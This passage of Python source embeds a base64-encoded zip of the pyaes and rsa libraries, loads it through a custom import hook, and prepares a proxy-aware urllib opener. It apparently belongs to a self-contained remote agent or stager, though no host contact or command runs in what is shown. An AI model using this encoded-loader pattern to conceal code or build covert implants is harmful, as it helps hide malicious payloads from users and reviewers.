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')

    import zipfile
    zf = zipfile.ZipFile(io.BytesIO(cryptolib), 'r')
    sys.meta_path.append(CFinder('crypto', zf))
    import pyaes
    import rsa
except ImportError:
    has_crypto = False
else:
    has_crypto = True

try:
    urllib_imports = ['ProxyHandler', 'Request', 'build_opener', 'install_opener', 'urlopen']
    if sys.version_info[0] < 3:
        urllib = __import__('urllib2', fromlist=urllib_imports)
    else:
        urllib = __import__('urllib.request', fromlist=urllib_imports)
except ImportError:
    has_urllib = False
else:
    has_urllib = True

if sys.version_info[0] < 3:
    is_str = lambda obj: issubclass(obj.__class__, str)
    is_bytes = lambda obj: issubclass(obj.__class__, str)
    bytes = lambda *args: str(*args[:1])
    NULL_BYTE = '\x00'
    unicode = lambda x: (x.decode('UTF-8') if isinstance(x, str) else x)
else:
    if isinstance(__builtins__, dict):
        is_str = lambda obj: issubclass(obj.__class__, __builtins__['str'])
        str = lambda x: __builtins__['str'](x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
    else:
        is_str = lambda obj: issubclass(obj.__class__, __builtins__.str)
        str = lambda x: __builtins__.str(x, *(() if isinstance(x, (float, int)) else ('UTF-8',)))
